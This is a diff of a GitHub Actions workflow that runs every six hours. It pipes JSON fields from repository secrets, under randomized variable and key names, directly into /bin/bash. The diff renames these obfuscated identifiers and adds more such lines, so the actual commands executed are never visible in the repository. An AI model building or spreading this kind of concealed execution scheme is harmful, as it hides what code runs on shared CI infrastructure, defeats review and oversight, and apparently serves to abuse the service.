@@ -3,21 +3,23 @@ name: chenziyuan6718
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
-
-jobs:  # 22238
+    - cron: '37 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chenziyuan6718
         env:
-          q90985: ${{ secrets.q90985 }}
+          hnk9: ${{ secrets.hnk9 }}
         run: |
-          echo $q90985 | jq -r .p58022 | /bin/bash
-          echo $khx2 | jq -r .dwfks27709 | /bin/bash
-          echo $np128 | jq -r .vlymd33723 | /bin/bash
-          echo $ubs5106 | jq -r .uhxa606 | /bin/bash
-          echo $ibe28 | jq -r .e52162 | /bin/bash
+          echo $hnk9 | jq -r .mxecb9 | /bin/bash
+          echo $gsby37 | jq -r .lwu72829 | /bin/bash
+          echo $wkse6116 | jq -r .daq2 | /bin/bash
+          echo $t5371 | jq -r .lqmbi5 | /bin/bash
+          echo $trcs7 | jq -r .i235 | /bin/bash
+          echo $kiev9729 | jq -r .dsddv904 | /bin/bash
+          echo $x9421 | jq -r .qvpp7 | /bin/bash
+          echo $obsjt17200 | jq -r .rz72 | /bin/bash
+          echo $pgrr63280 | jq -r .shb57825 | /bin/bash
 
